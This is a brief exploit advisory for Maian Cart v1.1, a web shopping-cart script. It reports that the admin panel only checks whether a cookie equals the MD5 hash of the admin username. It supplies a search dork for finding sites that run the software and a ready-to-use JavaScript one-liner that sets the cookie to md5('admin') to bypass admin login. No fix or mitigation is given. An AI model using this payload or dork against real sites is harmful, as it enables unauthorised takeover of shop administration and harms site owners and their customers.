URL: http://www.maianscriptworld.co.uk
Dork: Powered by Maian Cart v1.1

Description:
Maian Car v1.1 is suffering from insecure cookie handling, the /admin/index.php only checks if cookie mccart_cookie,
equals admin username(md5)

Exploit:
javascript:document.cookie = "mccart_cookie=21232f297a57a5a743894a0e4a801fc3; path=/"

Note:
The cookie value must be md5(the username). For example, 21232f297a57a5a743894a0e4a801fc3 = admin
